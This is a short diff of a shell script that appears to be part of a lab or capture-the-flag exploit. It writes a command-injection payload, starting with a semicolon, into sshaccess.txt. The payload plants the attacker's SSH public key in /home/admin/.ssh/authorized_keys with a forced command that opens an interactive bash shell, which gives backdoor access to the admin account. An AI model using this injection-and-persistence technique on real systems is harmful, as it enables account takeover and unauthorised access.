@@ -9,9 +9,6 @@ PUBKEY=$(cat ~/.ssh/id_rsa.pub)
 # Navigate to the desired directory
 cd /home/ralph/Desktop/newsletter/tools/
 
-#COM='command="clear"'
-COM=''
-
 # Create and write to sshaccess.txt
 echo ";mkdir -p /home/admin/.ssh && echo 'command=\"clear && echo Welcome to admin \:\) && /bin/bash -i\" $PUBKEY' > /home/admin/.ssh/authorized_keys && chmod 700 /home/admin/.ssh && chmod 600 /home/admin/.ssh/authorized_keys; whoami" > sshaccess.txt
 
